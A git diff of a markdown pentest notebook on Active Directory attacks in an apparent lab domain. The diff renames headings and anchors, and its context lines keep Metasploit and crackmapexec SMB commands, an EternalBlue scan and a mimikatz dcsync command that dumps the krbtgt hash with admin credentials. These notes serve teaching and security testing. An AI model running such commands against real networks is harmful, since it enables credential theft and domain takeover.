@@ -18,20 +18,20 @@ This is a collection of notes about active directory and (post)exploitation
   * [Enum Shares](#enum-shares)
     + [smbclient](#smbclient)
     + [smbmap](#smbmap)
-    + [smb_enumshares / Metasploit](#smb-enumshares---metasploit)
-    + [crackmaexec / shares](#crackmaexec---shares)
+    + [smb_enumshares](#smb-enumshares)
+    + [crackmaexec](#crackmaexec)
   * [Checking your rights for remote device](#checking-your-rights-for-remote-device)
-    + [SMB_Login / Metasploit](#smb-login---metasploit)
+    + [SMB_Login](#smb-login)
     + [Crackmapexec](#crackmapexec-1)
   * [Sharphound](#sharphound)
   * [Bloodhound](#bloodhound)
 - [Exploitation](#exploitation)
   * [SMB Relay Attack](#smb-relay-attack)
   * [Abusing ACL](#abusing-acl)
-    + [GenericALL / User](#genericall---user)
-    + [GenericALL / Group](#genericall---group)
+    + [GenericALL-User](#genericall-user)
+    + [GenericALL-Group](#genericall-group)
   * [ms17_010_eternalblue](#ms17-010-eternalblue)
-    + [smb_ms17_010 / metasploit](#smb-ms17-010---metasploit)
+    + [smb_ms17_010](#smb-ms17-010)
   * [AS-REP Roasting](#as-rep-roasting)
     + [Generate vulnerability](#generate-vulnerability)
     + [Exploitation](#exploitation-1)
@@ -47,12 +47,13 @@ This is a collection of notes about active directory and (post)exploitation
     + [psexec](#psexec)
 - [Post-Exploitation](#post-exploitation)
   * [Golden Ticket](#golden-ticket)
-  * [Machine Domain admin (Use machine NTLM hash)](#machine-domain-admin--use-machine-ntlm-hash-)
+  * [Machine Domain admin-Use machine NTLM hash](#machine-domain-admin-use-machine-ntlm-hash)
   * [Credential Collection](#credential-collection)
-    + [mimikatz logonpasswords (cmd needs to run administrators rights / locally)](#mimikatz-logonpasswords--cmd-needs-to-run-administrators-rights---locally-)
-    + [mimikatz dcsync (dcsync / authuser should be admin rights)](#mimikatz-dcsync--dcsync---authuser-should-be-admin-rights-)
+    + [mimikatz logonpasswords](#mimikatz-logonpasswords)
+    + [mimikatz dcsync](#mimikatz-dcsync)
 
 <small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>
+
 
 
 
@@ -318,7 +319,7 @@ Connect
 			SYSVOL                                                  READ ONLY       Logon server share 
 
 
-### smb_enumshares / Metasploit
+### smb_enumshares
 
 	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbuser thor
 	smbuser => thor
@@ -342,7 +343,7 @@ Connect
 	[*] Auxiliary module execution completed
 
 
-### crackmaexec / shares
+### crackmaexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb 192.168.200.100 -u thor -p Pass123! -d valhalla.local --shares
@@ -361,7 +362,7 @@ Connect
 
 ## Checking your rights for remote device
 
-### SMB_Login / Metasploit
+### SMB_Login
 
 	msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
 	smbuser => administrator
@@ -626,7 +627,7 @@ ntlmrelayx shell
 
 ## Abusing ACL
 
-### GenericALL / User
+### GenericALL-User
 
 We will check bloodhound and user has GenericAll rights for another user
 
@@ -650,7 +651,7 @@ Fail with another user
 	PS C:\Users\testuser\Desktop\sharphound>
 
 
-### GenericALL / Group
+### GenericALL-Group
 
 Groups for dontmindme user 
 
@@ -751,7 +752,7 @@ try to add with idontmind user
 
 ## ms17_010_eternalblue
 
-### smb_ms17_010 / metasploit
+### smb_ms17_010
 
 	msf6 auxiliary(scanner/smb/smb_ms17_010) > run
 
@@ -1129,7 +1130,7 @@ Access remote pc
 ![image](https://user-images.githubusercontent.com/13157446/129424166-5296aee2-0d58-4906-8331-19c1d34e3526.png)
 
 
-## Machine Domain admin (Use machine NTLM hash)
+## Machine Domain admin-Use machine NTLM hash
 
 	We need Local Admin rights on machine
 
@@ -1233,7 +1234,9 @@ regular cmd shell (access denied)
 
 ## Credential Collection
 
-### mimikatz logonpasswords (cmd needs to run administrators rights / locally)
+### mimikatz logonpasswords
+
+ cmd needs to run administrators rights / locally
 
 	PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe
 
@@ -1279,8 +1282,9 @@ regular cmd shell (access denied)
 			credman :
 			
 			
-### mimikatz dcsync (dcsync / authuser should be admin rights)
+### mimikatz dcsync
 
+authuser should be admin rights
 
 	mimikatz # lsadump::dcsync /domain:valhalla.local /user:krbtgt /authuser:administrator /authpassword:Pass123!
 	[DC] 'valhalla.local' will be the domain
